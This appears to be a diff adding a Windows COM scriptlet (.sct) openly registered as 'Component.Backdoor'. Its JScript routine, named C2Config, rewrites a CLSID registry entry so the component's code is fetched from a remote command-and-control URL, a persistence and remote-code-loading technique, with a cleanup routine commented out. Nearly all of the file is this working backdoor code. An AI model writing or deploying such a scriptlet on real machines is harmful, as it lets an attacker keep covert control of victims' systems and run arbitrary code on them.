@@ -1,0 +1,37 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Component"
+    progid="Component.Backdoor"
+    version="1.00"
+    classid="{10001111-0000-0000-0000-00000000ACDC}"
+>
+</registration>
+
+<public>
+    <method name="Main">
+    </method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+function C2Config() {
+	//The default is to use the path to a local file... Here, I just rewrite the regkey, and now, the Class definition comes form the interwebs. Woo!
+    var WshShell = new ActiveXObject("WScript.Shell");
+	var strRegPath = "HKEY_CLASSES_ROOT\\CLSID\\{10001111-0000-0000-0000-00000000ACDC}\\ScriptletURL\\";
+	WshShell.RegWrite(strRegPath, "http://127.0.0.1:8080/c2.js", "REG_SZ");
+	}
+/*
+function Cleanup() { }
+//Clean your room!
+*/ 
+function Main() {
+	C2Config();
+	//Cleanup();	
+	}
+	
+]]>
+</script>
+
+</scriptlet>
